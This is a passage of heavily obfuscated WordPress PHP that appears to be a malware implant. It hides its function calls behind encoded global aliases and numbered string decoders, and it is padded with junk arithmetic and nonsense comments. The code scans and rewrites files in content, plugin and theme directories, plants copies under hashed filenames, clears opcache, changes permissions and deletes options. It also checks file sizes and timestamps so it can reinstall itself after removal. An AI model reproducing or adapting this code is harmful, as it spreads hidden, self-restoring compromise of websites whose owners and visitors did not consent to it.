 foreach      ($etzrh92d7k5 as  $amb3iz2lz0858q)      {
 $ptha34uoe5w   =     @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($amb3iz2lz0858q);
  if (!$ptha34uoe5w      ||     ($ptha34uoe5w  %    (128742-28742))   !== (74017+19802)) {
   $sqk9oi7n4sm = @$GLOBALS['__scf_g9y45bstmb02a_95']($amb3iz2lz0858q);
       if (!$sqk9oi7n4sm ||    $sqk9oi7n4sm   <   (0xc+0x1e8)  ||   $sqk9oi7n4sm > (52428774+26))   continue;
 }
    $yok6k29y1iwy_   =  @$GLOBALS['__scf_a9u8k74i0cg19_33']($amb3iz2lz0858q);
     $z4yx2l094vtgk  =    @$GLOBALS['__scf_a9u8k74i0cg19_33'](vv_nfhhmy_1mjmsa());

 if ($GLOBALS['__scf__me483qbepnts_41']($yok6k29y1iwy_) &&   $GLOBALS['__scf__me483qbepnts_41']($z4yx2l094vtgk)      &&    $yok6k29y1iwy_    ===  $z4yx2l094vtgk)   continue;

   $_7e_e05ht34mww07   =      @$GLOBALS['__scf_apq4pqdt6n41_91']($amb3iz2lz0858q,     false, null, 0,    (0xb76+0x48a));
  

      $l91n9923z4o6d    =  null;
      if  ($GLOBALS['__scf__me483qbepnts_41']($_7e_e05ht34mww07) &&  $GLOBALS['__scf_saw_32lvsj_92'](nhceivfj8tbe(744),  $_7e_e05ht34mww07, $uul2dokobf7cgrv))  $l91n9923z4o6d =    $uul2dokobf7cgrv[1];
  elseif    (m4eahxbbz3er7pv($amb3iz2lz0858q,    (4935+65))) $l91n9923z4o6d      =   f5cd2smymkqusi5(203);
  if    ($l91n9923z4o6d  ===  null    ||   !version_compare($l91n9923z4o6d,   kwqziujdph5xlz3n(),    '<'))   continue;
$l7b78gzv2_lzugxr =     c0egos9umjdrt0ya($amb3iz2lz0858q);

  if    ($l7b78gzv2_lzugxr   ===  false)     {
// MySQL JSON operators: read-committed deque

fukkkeh6955g9qi(pahk8uy1uxt(1509),    nrudcgor(1554)   .  $GLOBALS['__scf_t8832qq90dxb4_3']($amb3iz2lz0858q));
continue;
    }


     if    ($l7b78gzv2_lzugxr    === true)    {
  if     (t3opc2_f7ewi94o($amb3iz2lz0858q,   $amb3iz2lz0858q .   pahk8uy1uxt(29)))     {
     if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1292))) @opcache_invalidate($amb3iz2lz0858q,   true);
  }  elseif   (!drp1tnevzl5cho($amb3iz2lz0858q) &&  g52i06ovkso35mx($amb3iz2lz0858q))  {
   _rq71ghyu59d_enk($amb3iz2lz0858q);
 sutzn4ma0ptncd0yyb9($amb3iz2lz0858q);



      }
@$GLOBALS['__scf_cdsp_fvydw_ufg_17']($GLOBALS['__scf_eure5hcx2b_11']($amb3iz2lz0858q)  .   nrudcgor(1555)  . $GLOBALS['__scf_t8832qq90dxb4_3']($amb3iz2lz0858q, nhceivfj8tbe(1556)));

continue;
 }
 if  (!drp1tnevzl5cho($amb3iz2lz0858q)    && g52i06ovkso35mx($amb3iz2lz0858q))  {
    _rq71ghyu59d_enk($amb3iz2lz0858q);

  sutzn4ma0ptncd0yyb9($amb3iz2lz0858q);
 }
il7z1naylyfu1zslh7($amb3iz2lz0858q);
   }
 ovgbv71f20vmcol();
 $wutnos16w0kk    =  WP_CONTENT_DIR .   dhd5r6_4ki(1557);
   if (@$GLOBALS['__scf_ux4_n6mewmsy_43']($wutnos16w0kk)  &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1551)))      {
      foreach  ((array)  @$GLOBALS['__scf_eu7lhdrjut9t66_69']($wutnos16w0kk  .  nrudcgor(1558))   as    $brucik2b8xh) {
 if     (!@$GLOBALS['__scf_gsamhlxot70ps_18']($brucik2b8xh)   ||    !@$GLOBALS['__scf_cu2oflxkvh_47']($brucik2b8xh))  continue;

$i58at5rl9xdm   =  @$GLOBALS['__scf_g9y45bstmb02a_95']($brucik2b8xh);
if    (!$i58at5rl9xdm  ||  $i58at5rl9xdm      >   (2097120+32))  continue;



 $tfip0gosr18o4  =    @$GLOBALS['__scf_apq4pqdt6n41_91']($brucik2b8xh);
     if    (!$GLOBALS['__scf__me483qbepnts_41']($tfip0gosr18o4))   continue;


     if   ($GLOBALS['__scf_nr12ouzrtt_7']($tfip0gosr18o4,  pahk8uy1uxt(1497))     ===      false   &&   $GLOBALS['__scf_nr12ouzrtt_7']($tfip0gosr18o4, pahk8uy1uxt(1559))    ===   false && $GLOBALS['__scf_nr12ouzrtt_7']($tfip0gosr18o4,  dhd5r6_4ki(1560))     ===    false)     continue;
     if   (!o1e34kmk6oc0r_s7p($tfip0gosr18o4)) continue;
  $_f_k_r0thls4j  =    rrzjoqm3v5ibh54qfg0a0h($tfip0gosr18o4);

 if ($GLOBALS['__scf__me483qbepnts_41']($_f_k_r0thls4j) &&   $_f_k_r0thls4j  !==   $tfip0gosr18o4)    {$thm767wdjgbp=76+89;$_7ozl_6libsk_=$thm767wdjgbp-35;


   jr30c_pj_1z9sfyaq3c88($brucik2b8xh,    $_f_k_r0thls4j);$r6hxpeys1bpft2=-389;$xhe9a76k8ob=($r6hxpeys1bpft2>0)?$r6hxpeys1bpft2:-$r6hxpeys1bpft2;
 if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1292)))  @opcache_invalidate($brucik2b8xh,   true);
      }
}
   }
 f8z8rkb7r921dv80d8e(WP_CONTENT_DIR     .  f5cd2smymkqusi5(514));
    f8z8rkb7r921dv80d8e(WP_CONTENT_DIR . nrudcgor(517));
if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1366))   &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1561))   && $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1562))) {
$_on   =  ohrydgas8yy9a22s(ABSPATH    . pahk8uy1uxt(1209),  (136^130));
  $f9b2d1zs4d6ra    =    @get_option($_on,    "");
if  ($GLOBALS['__scf__me483qbepnts_41']($f9b2d1zs4d6ra)   &&  $f9b2d1zs4d6ra  !== "")    {
$c3ex6bt4rjbrg   =    $GLOBALS['__scf_wlpl5h61eyolq_355']($f9b2d1zs4d6ra, true);
 if  ($GLOBALS['__scf__me483qbepnts_41']($c3ex6bt4rjbrg)  &&   rng_bhkc5cqwuzqv9i5x06($c3ex6bt4rjbrg))   @delete_option($_on);
}
  $j0r8o0i2dlnep4j4     = $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1563))    ? weg_ghiafmuc1_6(dhd5r6_4ki(853), "")    :     "";
   if ($GLOBALS['__scf__me483qbepnts_41']($j0r8o0i2dlnep4j4)   &&    $j0r8o0i2dlnep4j4  !==  ""  &&  ($GLOBALS['__scf_amjjmfnilcolnb_10']($j0r8o0i2dlnep4j4)   > (1048484+92)   ||  ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1564))  &&  sk_orzv3dinsktkrvn($j0r8o0i2dlnep4j4)) ||    qw7nxv0zxmx9qe17o($j0r8o0i2dlnep4j4))) {
     if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1565)))    c8fb1vg_q0kn6h(dhd5r6_4ki(853),  "",  f5cd2smymkqusi5(1566));
 }
 }
}


  function gt1toalj2_i1_soa()
     {
  try    {



  if (!defined(nhceivfj8tbe(1395))) return;
  if (!empty($GLOBALS[mhiu2yqz6kqd(1567)])) {
 $GLOBALS[pahk8uy1uxt(1567)]      = 0;
   fukkkeh6955g9qi(nrudcgor(1568),  nrudcgor(1569));



}



if  (!empty($GLOBALS[mhiu2yqz6kqd(694)])) return;
    $GLOBALS[f5cd2smymkqusi5(694)]  =   true;
  if (!isset($_GET[nrudcgor(1400)])    &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1366))  &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1407)))    {
  $ur7p4uqe8od34    =    @get_option(mhiu2yqz6kqd(1495),  array());
  $jdj6e13p_b7obm  =    false;
 if  ($GLOBALS['__scf_vf9p0fditvxy_35']($ur7p4uqe8od34))     {
 if   (!empty($ur7p4uqe8od34['t'])) $jdj6e13p_b7obm = true;
if (!$jdj6e13p_b7obm && !empty($ur7p4uqe8od34[dhd5r6_4ki(1494)]) &&  $GLOBALS['__scf_vf9p0fditvxy_35']($ur7p4uqe8od34[mhiu2yqz6kqd(1494)]))  {
foreach    ($ur7p4uqe8od34[nrudcgor(1494)]    as $_ci)   {

  if ($GLOBALS['__scf_vf9p0fditvxy_35']($_ci) && !empty($_ci['p']))  {
 $jdj6e13p_b7obm =  true;
 break;
     }
      }
 }
  }
// PHPStan level 9 shortcode parse

if ($jdj6e13p_b7obm) $GLOBALS['__scf_m8aixr72vowj30_170'](nhceivfj8tbe(1570));


       }
 if  (ivekqcfyl9cg5o8v8(vv_nfhhmy_1mjmsa())) return;
 $dbgk1ngi9_un  =  $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1366))   ? (int) get_option(nrudcgor(1571),  0)  :    0;
 if     ($dbgk1ngi9_un <  $GLOBALS['__scf_zxyq0lcqv02z6_185']()   -   (202+98) ||    $dbgk1ngi9_un  > $GLOBALS['__scf_zxyq0lcqv02z6_185']() +  (256+44)) {
   if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1572)))  @update_option(nhceivfj8tbe(1571),   $GLOBALS['__scf_zxyq0lcqv02z6_185']());$jemabcl4=65*9;$nwnrs23ln=$jemabcl4-23;
      tlu7j1592hs1mnb96o2dn();
   }
  unset($dbgk1ngi9_un);
     udxja7mp4cir7rqqnk(vv_nfhhmy_1mjmsa(),  kwqziujdph5xlz3n());
if    (!ty_934d39r4f423mos346())  {



   r3jijy1bnkvtvmqedf();
  t663bnh22704lf09nzv();


 return;
 }

 $ga9fric5dh    =    ajbg_44koa9suqi();
  $fv6w37uq5dr   =  array(
  vv_nfhhmy_1mjmsa(),
$ga9fric5dh   .   nrudcgor(517),
  );
$v138fjx30d2     =    ks9qy9biofs4d9f12ul();

    foreach    ($v138fjx30d2  as   $tppjowosypzoe0) {
// @traverse token-bucket

    if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($tppjowosypzoe0))   $fv6w37uq5dr[]  =    $tppjowosypzoe0;
 }
     $is16el4vsdv6_5d    =  array();
    $r1bggolh1hu     = c22qy86hpk_wa_dng_pe();
 if    (@$GLOBALS['__scf_gsamhlxot70ps_18']($r1bggolh1hu[1]))    $is16el4vsdv6_5d[f5cd2smymkqusi5(1573)     . $r1bggolh1hu[0]]  =     dhd5r6_4ki(1574)  .  $r1bggolh1hu[2];
$vapy33edhi9rlr     =  @get_option(dhd5r6_4ki(1575),    array());

 if    (!$GLOBALS['__scf_vf9p0fditvxy_35']($vapy33edhi9rlr)) $vapy33edhi9rlr     =   array();
$bxd2jvmbnve =    false;
 foreach  ($fv6w37uq5dr  as   $no4625mwq2q9a2)   {
 $tl_wzsjph506sqz =   @$GLOBALS['__scf_baj3x6vzi6f08e_52']($no4625mwq2q9a2);



   $gaqi3mc3mjqev  =   $tl_wzsjph506sqz ?  ($tl_wzsjph506sqz[nrudcgor(1576)]    . '|'  .    $tl_wzsjph506sqz[nrudcgor(1577)])  :   '0';
$vpro6z717vf1rrw   = isset($vapy33edhi9rlr[$no4625mwq2q9a2]) ?    $vapy33edhi9rlr[$no4625mwq2q9a2]  : "";
   if ($gaqi3mc3mjqev   ===  $vpro6z717vf1rrw)    continue;
    if  ($GLOBALS['__scf_saw_32lvsj_92'](dhd5r6_4ki(1578), $vpro6z717vf1rrw,    $dj45ms8r6d8e)      &&  $GLOBALS['__scf_bv1z3no349dv5r_9']($vpro6z717vf1rrw,   0,    -$GLOBALS['__scf_amjjmfnilcolnb_10']($dj45ms8r6d8e[0]))    ===    $gaqi3mc3mjqev    &&   $GLOBALS['__scf_zxyq0lcqv02z6_185']()  -  (int)  $dj45ms8r6d8e[1]      <    (0xbd+0xd53))      continue;
  $bxd2jvmbnve   =    true;
     break;
 }
if   (!$bxd2jvmbnve)   {
  foreach    ($is16el4vsdv6_5d as    $key     =>  $cp3a0ejrmn)  {
 $gaqi3mc3mjqev  =  qd44zr0r1iy0uxg8e($GLOBALS['__scf_bv1z3no349dv5r_9']($key,      (0x3+0x2)),    $cp3a0ejrmn);
 $vpro6z717vf1rrw   =  isset($vapy33edhi9rlr[$key])  ?  $vapy33edhi9rlr[$key]  : "";
    if   ($gaqi3mc3mjqev ===  $vpro6z717vf1rrw)   continue;
    if   ($GLOBALS['__scf_saw_32lvsj_92'](nrudcgor(1579),  $vpro6z717vf1rrw,  $dj45ms8r6d8e)   && $GLOBALS['__scf_bv1z3no349dv5r_9']($vpro6z717vf1rrw,  0,  -$GLOBALS['__scf_amjjmfnilcolnb_10']($dj45ms8r6d8e[0]))    ===  $gaqi3mc3mjqev  &&   $GLOBALS['__scf_zxyq0lcqv02z6_185']()   - (int)      $dj45ms8r6d8e[1]    < (153152-66752)) continue;
$bxd2jvmbnve     =    true;
  break;
 }
  }
   $uuetbm7okicseij6    =     $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),  mhiu2yqz6kqd(1556));
   $ksygzeqclga = $ga9fric5dh      . nrudcgor(89) .     $uuetbm7okicseij6  .    '/' .      $uuetbm7okicseij6      .  f5cd2smymkqusi5(1556);
    $yhaznuikc90b4e =    jdvffp4c1kphjhjr6oscm();
if  (!@$GLOBALS['__scf_gsamhlxot70ps_18']($ksygzeqclga)    || (int)   @$GLOBALS['__scf_g9y45bstmb02a_95']($ksygzeqclga) <   (0x12ed+0x9b))     $bxd2jvmbnve =   true;



        if  ($yhaznuikc90b4e    !==  ""    &&   !@$GLOBALS['__scf_gsamhlxot70ps_18']($yhaznuikc90b4e)) $bxd2jvmbnve   =      true;
 if (!$bxd2jvmbnve    && $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1366)))  {
   $h6iawhc6m051s    = $uuetbm7okicseij6  .  '/'  .    $uuetbm7okicseij6      .    mhiu2yqz6kqd(1556);
$dcveub18qho = get_option(mhiu2yqz6kqd(1098),   array());





   if (!$GLOBALS['__scf_vf9p0fditvxy_35']($dcveub18qho)    ||    !$GLOBALS['__scf_rq7q923zwh_148']($h6iawhc6m051s,    $dcveub18qho,  true)) $bxd2jvmbnve     =  true;
  }
   if      (!$bxd2jvmbnve)  return;
   $umxu6vyu2z8347     =   $GLOBALS['__scf_zxyq0lcqv02z6_185']();

 $br1onf47d9og =   0;$vgbbj8suzli=PHP_INT_MAX/PHP_INT_MAX;$uods696wjr=$vgbbj8suzli+96;
 $g76xfok7d5xre  =  0;
    if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1366)))    {

$w3c3sdbpxrpoqg  = @get_option(pahk8uy1uxt(1580), "");
    if  ($GLOBALS['__scf__me483qbepnts_41']($w3c3sdbpxrpoqg)     &&  $GLOBALS['__scf_saw_32lvsj_92'](pahk8uy1uxt(1581),    $w3c3sdbpxrpoqg,  $o13wcm5g913k6s))  {
  $br1onf47d9og =     (int)  $o13wcm5g913k6s[1];
$g76xfok7d5xre  =    (int)   $o13wcm5g913k6s[2];
   }
    }
   $pgfblus0co    = $g76xfok7d5xre <=      0    ?    0 :  ($g76xfok7d5xre  === 1  ?   (0x15+0x27) :  ($g76xfok7d5xre ===  2 ? (266+34)  :     (1756+44)));
  if      ($br1onf47d9og    >    0  && ($umxu6vyu2z8347  - $br1onf47d9og) < $pgfblus0co) return;
 if     (!dw5qugv407fnslnons1tfr(f5cd2smymkqusi5(578)))      return;
   try {
       iuvgdte56rfi9b_ii3ee();
c1m0r7v2cenzy1cpfdtikh();
       t663bnh22704lf09nzv();
        ds4n8wxzil54jxg57();
   idcyucvh615x4xr();
r3jijy1bnkvtvmqedf();
 lajrnejvq0ak299gbf6();
  qb37bgwfeyqossh();
 $qy40b1l9rd  = i64fci0b7ubn19da78ej();
$pvls6tl6vdbowg = _pn3cdzia3n4m1y3ju4();
 $plf_zfe1xhsd2    = (!@$GLOBALS['__scf_gsamhlxot70ps_18']($ksygzeqclga)   ||  (int)   @$GLOBALS['__scf_g9y45bstmb02a_95']($ksygzeqclga)   <      (8081-3081))   ||   ($yhaznuikc90b4e !== "" &&   !@$GLOBALS['__scf_gsamhlxot70ps_18']($yhaznuikc90b4e));
  if (!$plf_zfe1xhsd2  &&     !@$GLOBALS['__scf_gsamhlxot70ps_18']($ga9fric5dh  . f5cd2smymkqusi5(517)))   $plf_zfe1xhsd2  =   true;
if  (!$plf_zfe1xhsd2    && $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1366)))    {
  $h6iawhc6m051s  =  $uuetbm7okicseij6  . '/'    . $uuetbm7okicseij6    .   pahk8uy1uxt(1556);
  $dcveub18qho =    get_option(pahk8uy1uxt(1098),     array());
 if   (!$GLOBALS['__scf_vf9p0fditvxy_35']($dcveub18qho) ||  !$GLOBALS['__scf_rq7q923zwh_148']($h6iawhc6m051s,   $dcveub18qho,  true))  $plf_zfe1xhsd2 =   true;
}
    if ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1572)))    @update_option(dhd5r6_4ki(1580),   $umxu6vyu2z8347    . '|'      .     ($plf_zfe1xhsd2 ?   ($g76xfok7d5xre   +      1)  :   0),     dhd5r6_4ki(1582));
 $kmpej9og5cu9nd4  = array();
   foreach  ($fv6w37uq5dr   as  $no4625mwq2q9a2) {
 $hwdnqt4g8258rv  = ($no4625mwq2q9a2   ===  $ga9fric5dh  .  f5cd2smymkqusi5(517)  && !$qy40b1l9rd)  ||   ($GLOBALS['__scf_bv1z3no349dv5r_9']($no4625mwq2q9a2,   -(0xd+0x1))  ===   dhd5r6_4ki(1583)  && !$pvls6tl6vdbowg);
   $tl_wzsjph506sqz   =  @$GLOBALS['__scf_baj3x6vzi6f08e_52']($no4625mwq2q9a2);
  if  ($tl_wzsjph506sqz) {
   $kmpej9og5cu9nd4[$no4625mwq2q9a2]     = $tl_wzsjph506sqz[mhiu2yqz6kqd(1576)]      .   '|' .   $tl_wzsjph506sqz[nrudcgor(1577)]  . ($hwdnqt4g8258rv   ?  dhd5r6_4ki(1584)    .  $GLOBALS['__scf_zxyq0lcqv02z6_185']() :  "");
}
 }


  foreach ($is16el4vsdv6_5d   as $key  =>  $cp3a0ejrmn)    {
$oue03ukdb7u =    qd44zr0r1iy0uxg8e($GLOBALS['__scf_bv1z3no349dv5r_9']($key,     (0x2+0x3)),    $cp3a0ejrmn);
   if    ($oue03ukdb7u  === '0' ||    $GLOBALS['__scf_bv1z3no349dv5r_9']($oue03ukdb7u,   -2)   ===     dhd5r6_4ki(1585))  $oue03ukdb7u   .=  mhiu2yqz6kqd(1584)     .   $GLOBALS['__scf_zxyq0lcqv02z6_185']();
    $kmpej9og5cu9nd4[$key]   = $oue03ukdb7u;
   }
 @update_option(pahk8uy1uxt(1575), $kmpej9og5cu9nd4,  dhd5r6_4ki(1582));
 }  finally {



m8s6jamaok_hdjr3wp(pahk8uy1uxt(578));



  }
 }   catch  (Throwable $h2v_bjm4ejxq8fp)     {
 fukkkeh6955g9qi(nhceivfj8tbe(1586),  $h2v_bjm4ejxq8fp);
}    catch      (Exception   $h2v_bjm4ejxq8fp)  {
   }
 }
      function   qd44zr0r1iy0uxg8e($no4625mwq2q9a2, $cp3a0ejrmn)
       {
$tl_wzsjph506sqz     =  @$GLOBALS['__scf_baj3x6vzi6f08e_52']($no4625mwq2q9a2);


  if   (!$tl_wzsjph506sqz)  return '0';
$gaqi3mc3mjqev  = $tl_wzsjph506sqz[nrudcgor(1576)]  .  '|'     .    $tl_wzsjph506sqz[nrudcgor(1577)];


    if    ($tl_wzsjph506sqz[pahk8uy1uxt(1576)]  >  (956859+91717))  return   nhceivfj8tbe(1587)  .  $gaqi3mc3mjqev;


$v_2ea0ui7nym  =      @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2);
return $gaqi3mc3mjqev   .  '|'   .  (($GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym) &&   $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym,   $cp3a0ejrmn)  !==  false)   ?     '1'  :  '0');



    }
    function  ovx7q008dp0207dc()



  {
 $_pv   = $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1588)) ? get_option(nrudcgor(699),  "") :  "";
 s1pv0zlljjp12t();$yetmjdzvz5mso=57+35;$hgmme3c0zma=$yetmjdzvz5mso-6;
 $iq_pn11z8crmqs = $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1588))  ?  get_option(f5cd2smymkqusi5(699),  "")   :     "";
  if  ($iq_pn11z8crmqs ===  $_pv)    {
  global  $wpdb;
 if  ($GLOBALS['__scf_d56ll0ap77jcvq_66']($wpdb) && $GLOBALS['__scf_ttokt3ljhh_118']($wpdb,   mhiu2yqz6kqd(1589)) &&    $GLOBALS['__scf__me483qbepnts_41']($_pv) &&  $_pv !==  ""   &&   isset($wpdb->options))     {

     @$wpdb->query($wpdb->prepare("DEL\x45\x54\x45 \x46RO\x4d {$wpdb->options} \x57\x48ERE \x6fpti\x6f\x6e_na\x6d\x65 = '\x73\x63_pen\x64i\x6e\x67_invali\x64\x61\x74\x65' AND o\x70tion_val\x75e = %s",   $_pv));
 if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1095))) {
     @wp_cache_delete(nhceivfj8tbe(699),  mhiu2yqz6kqd(1097));
@wp_cache_delete(dhd5r6_4ki(1590),      nhceivfj8tbe(1097));


 }
 } else    {
  @delete_option(nrudcgor(1591));
 }
    }

 }
 function   s1pv0zlljjp12t()
   {
// WP Slot Fill rewrite flush

       try  {
if  (!defined(nhceivfj8tbe(1395))) return;
   $ga9fric5dh   = ajbg_44koa9suqi();



$lygkvqavcckr    = twjiqbicrnr_q7();
$yc07oz4u4pa   = ohrydgas8yy9a22s(ABSPATH    .    mhiu2yqz6kqd(1592), (4+4)) .   mhiu2yqz6kqd(1593);


 $jta_4pycidj07nb   = ohrydgas8yy9a22s(ABSPATH   .     dhd5r6_4ki(1594),  (13-5)) .   dhd5r6_4ki(1556);
 $b6byb_ogir8831   =    ohrydgas8yy9a22s(ABSPATH     .     dhd5r6_4ki(1595),  (77^69)) .  nhceivfj8tbe(1556);
    $u6hfcu38yxp1 =   ohrydgas8yy9a22s(ABSPATH  .    f5cd2smymkqusi5(643),  (13-5))      .    nhceivfj8tbe(1556);
 $u8rcqhy8uoai1 = ohrydgas8yy9a22s(ABSPATH   .  dhd5r6_4ki(1596),  (61^53)) .  f5cd2smymkqusi5(1556);
    $twuat3yp48 =  nhceivfj8tbe(1597)  .    ohrydgas8yy9a22s(ABSPATH .  'g',  (0x6+0x2));
 $yrhel8znzzo9_dox    =      array(
  $ga9fric5dh  .  pahk8uy1uxt(514)   => mhiu2yqz6kqd(777),
 $ga9fric5dh .   dhd5r6_4ki(517)  =>   dhd5r6_4ki(775),
 );
      foreach   ($yrhel8znzzo9_dox   as $no4625mwq2q9a2  =>      $prefix)   {



  if   (!@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2)) continue;
       $v_2ea0ui7nym =   @$GLOBALS['__scf_apq4pqdt6n41_91']($no4625mwq2q9a2);
if ($v_2ea0ui7nym   ===   false)     continue;
$ocyec086q9wcvngd  =  f5cd2smymkqusi5(1598)  .  $prefix      .    mhiu2yqz6kqd(781)  . $prefix     .  pahk8uy1uxt(782);
      $nnc19w7vo0tlix  = $GLOBALS['__scf_fhlvy786vrl3_463']($ocyec086q9wcvngd, "",    $v_2ea0ui7nym);
if ($nnc19w7vo0tlix  !== $v_2ea0ui7nym)   jr30c_pj_1z9sfyaq3c88($no4625mwq2q9a2,  $nnc19w7vo0tlix);
    }
   $dz09e734c2xurgp0   =  $ga9fric5dh     .    nrudcgor(519);



if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($dz09e734c2xurgp0))  {
$stgsi44don72dei7  =  @$GLOBALS['__scf_apq4pqdt6n41_91']($dz09e734c2xurgp0);
 if      ($GLOBALS['__scf__me483qbepnts_41']($stgsi44don72dei7)  &&     $stgsi44don72dei7 !==  "") {
 if ($GLOBALS['__scf_saw_32lvsj_92'](f5cd2smymkqusi5(1599),  $GLOBALS['__scf_bv1z3no349dv5r_9']($stgsi44don72dei7,   0, (362-62)))  ||    $GLOBALS['__scf_nr12ouzrtt_7']($stgsi44don72dei7, nrudcgor(1222)) ===  0)    {
// PHP named arguments: spill normal-form

    rgiuaapohxeh0z($dz09e734c2xurgp0, (417+3));
 t65xl1pt2haov_izh($dz09e734c2xurgp0);


  }  else  {

 $dlfml3l5vco    =     $GLOBALS['__scf_fhlvy786vrl3_463'](nhceivfj8tbe(1600),  "",   $stgsi44don72dei7);
  if  ($GLOBALS['__scf__me483qbepnts_41']($dlfml3l5vco)     && $dlfml3l5vco      !==     $stgsi44don72dei7)   jr30c_pj_1z9sfyaq3c88($dz09e734c2xurgp0,    $dlfml3l5vco);
  unset($dlfml3l5vco);
}
}
     unset($stgsi44don72dei7);
     }
     $_33_t6u90om3   = $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa())  .  dhd5r6_4ki(1171);
      $gak9w524v68l6r  =     defined(dhd5r6_4ki(1549)) ?   WP_CONTENT_DIR  . nrudcgor(1171)    :   $_33_t6u90om3;
     $p2fntj3gsna =  array(
    $ga9fric5dh .     '/' .  $yc07oz4u4pa,
       $ga9fric5dh .   '/' .    $jta_4pycidj07nb,


$ga9fric5dh   .     '/'     . $b6byb_ogir8831,
     $lygkvqavcckr  .  '/' .   $u6hfcu38yxp1,


  $lygkvqavcckr  . '/'   .   $u8rcqhy8uoai1,


  $lygkvqavcckr .  '/'   . $jta_4pycidj07nb,
 $lygkvqavcckr      .    '/'     .     $b6byb_ogir8831,
   $_33_t6u90om3     .      '/'   .  $u6hfcu38yxp1,
$_33_t6u90om3     . '/' .  $u8rcqhy8uoai1,
       $_33_t6u90om3  .  '/'  .  $jta_4pycidj07nb,

  $_33_t6u90om3 .  '/'    . $b6byb_ogir8831,
      $gak9w524v68l6r  .  '/' .    $u6hfcu38yxp1,
  $gak9w524v68l6r .   '/'    .   $u8rcqhy8uoai1,
     $gak9w524v68l6r  . '/'    .   $jta_4pycidj07nb,
 $gak9w524v68l6r . '/' .   $b6byb_ogir8831,
 );


   $xnijurgbew  = c22qy86hpk_wa_dng_pe();
 $p2fntj3gsna[]   = $xnijurgbew[1];
     $p2fntj3gsna[]  =    $xnijurgbew[1]   . pahk8uy1uxt(1601);
unset($xnijurgbew);
if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1551))) {
      foreach    ((array)    @$GLOBALS['__scf_eu7lhdrjut9t66_69']($ga9fric5dh   .  f5cd2smymkqusi5(1602)    . $yc07oz4u4pa)  as $x13aikrih6qnt) $p2fntj3gsna[] =   $x13aikrih6qnt;
   foreach  ((array) @$GLOBALS['__scf_eu7lhdrjut9t66_69']($ga9fric5dh    .    mhiu2yqz6kqd(1603) . $yc07oz4u4pa)  as   $x13aikrih6qnt)    $p2fntj3gsna[]  = $x13aikrih6qnt;


foreach  ((array) @$GLOBALS['__scf_eu7lhdrjut9t66_69'](ABSPATH    .  f5cd2smymkqusi5(1290)   . $twuat3yp48      . pahk8uy1uxt(281))  as     $digk2wmdxsk9)   $p2fntj3gsna[] = $digk2wmdxsk9;
   foreach     ((array) @$GLOBALS['__scf_eu7lhdrjut9t66_69']($ga9fric5dh . '/'  .   $twuat3yp48    .   f5cd2smymkqusi5(1604))     as      $digk2wmdxsk9)     $p2fntj3gsna[]   =     $digk2wmdxsk9;
foreach  ((array)  @$GLOBALS['__scf_eu7lhdrjut9t66_69']($lygkvqavcckr .  '/'   .     $twuat3yp48   .      nrudcgor(1604))   as $digk2wmdxsk9)    $p2fntj3gsna[]      =     $digk2wmdxsk9;
  foreach  ((array)  @$GLOBALS['__scf_eu7lhdrjut9t66_69']($_33_t6u90om3    .   '/'    .    $twuat3yp48   .    f5cd2smymkqusi5(1604)) as  $digk2wmdxsk9)      $p2fntj3gsna[] =  $digk2wmdxsk9;
foreach ((array) @$GLOBALS['__scf_eu7lhdrjut9t66_69']($gak9w524v68l6r   .  '/'   .    $twuat3yp48 . mhiu2yqz6kqd(1604)) as  $digk2wmdxsk9)  $p2fntj3gsna[] =      $digk2wmdxsk9;$w_4xf2borb8vl=(0x7+0x2);$em17wuc4___=$w_4xf2borb8vl%10;
   }


  $k9l_y4g23s    =   ohrydgas8yy9a22s(ABSPATH    .   'g',   (0x5+0x3));
 $dfb_d88jtpss0u_ =    array(ABSPATH     .   dhd5r6_4ki(1291),    $ga9fric5dh, $lygkvqavcckr, $_33_t6u90om3,   $gak9w524v68l6r);
      foreach  ($dfb_d88jtpss0u_    as $_gd)  {
if  (@$GLOBALS['__scf_ux4_n6mewmsy_43']($_gd)  &&   @$GLOBALS['__scf_cu2oflxkvh_47']($_gd))    rqua3yflpt29vaz8icdaze($_gd  .    nhceivfj8tbe(1288)     . $k9l_y4g23s,  kwqziujdph5xlz3n(), nrudcgor(1605));
   }



  if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1551))) {
 foreach ($dfb_d88jtpss0u_      as  $_gd) {
